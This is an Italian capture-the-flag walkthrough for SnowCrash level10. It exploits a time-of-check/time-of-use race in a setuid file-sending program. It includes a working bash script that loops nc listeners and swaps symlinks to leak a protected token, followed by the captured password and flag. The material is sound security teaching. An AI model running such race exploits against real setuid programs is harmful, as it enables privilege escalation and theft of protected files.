# Level10
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```
Con il comando `strings level10` possiamo capire che si tratta di un
programma per inviare il contenuto dei file tramite la porta `6969` e provando
ad eseguire il programma si può capire che accetta 2 argomenti per funzionare
dove il primo argomento deve essere il nome del file da inviare e il secondo
l'ip dove collegarsi.

### 2 passaggio:
Con il comando `ltrace ./level10 token 127.0.0.1` abbiamo il seguente output:
```bash
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                        = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)                          = 31
+++ exited (status 31) +++
```
Dunque il programma utilizza la funzione `access` per controllare i permessi sul file
da aprire, permessi che ovviamente non abbiamo sul file `token`.
Leggendo il `man` di `access` troviamo il seguente paragrafo:
>   Warning: Using these calls to check if a user is authorized to,
>   for example, open a file before actually doing so using open(2)
>   creates a security hole, because the user might exploit the short
>   time interval between checking and opening the file to manipulate
>   it.  For this reason, the use of this system call should be
>   avoided.  (In the example just described, a safer alternative
>   would be to temporarily switch the process's effective user ID to
>   the real ID and then call open(2).)

[Link man access](https://man7.org/linux/man-pages/man2/access.2.html)

### 3 passaggio:
Basta creare un semplice script con 3 passaggi fondamentali:
1. Chiamare `nc` in ascolto sulla porta 6969 e lasciarlo in background
2. Chiamare l'eseguibile con il file da inviare
3. Cambiare velocemente il file che invieremo tra un file di nostra proprietà e il file che dobbiamo effettivamente inviare
```bash
 1  #!/bin/bash
 2  echo "Spazzatura" > /tmp/flag
 3  for i in {0..50}
 4  do
 5    nc -l 6969
 6  done &
 7  for i in {0..50}
 8  do
 9    ~/level10 /tmp/l_flag 127.0.0.1 &> /dev/null
10  done &
11  for i in {0..50}
12  do
13    ln -fs /tmp/flag /tmp/l_flag
14    ln -fs ~/token /tmp/l_flag
15  done
```
Così da sfruttare una `Race Condition Vulnerability` e avere il seguente output:
```bash
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
Spazzatura
.*( )*.
Spazzatura
.*( )*.
woupa2yuojeeaaed06riuj63c
```

### 4 passaggio:
```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
